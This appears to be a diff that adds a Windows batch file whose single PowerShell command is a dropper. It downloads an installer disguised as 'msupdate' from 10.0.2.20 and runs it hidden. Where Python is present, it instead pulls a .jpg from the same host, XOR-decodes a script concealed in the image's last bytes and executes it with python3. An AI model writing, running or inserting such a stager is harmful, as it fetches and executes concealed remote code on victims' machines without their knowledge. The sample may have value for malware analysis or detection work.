@@ -1,0 +1,2 @@
+@echo off
+powershell.exe -command 'if ((&{python -V} 2>&1 | % gettype) -eq [System.Management.Automation.ErrorRecord]) {Invoke-WebRequest http://10.0.2.20/msupdate.msi -OutFile C:\Temp\msupdate.msi; Start-Process "C:\Temp\msupdate.exe" -WindowStyle Hidden} else {$s = (Invoke-WebRequest "http://10.0.2.20/G78GAP3GQV8B.jpg").Content; $k = $s[-4934..-2467]; $v = $s[-2467..-1]; $o = @(); for ($i = 0; $i -lt 2467; $i++) { $o += $k[$i] -bxor $v[$i]; }; $o = [System.Text.Encoding]::ASCII.GetString($o); python3 -c "$($o)"}'
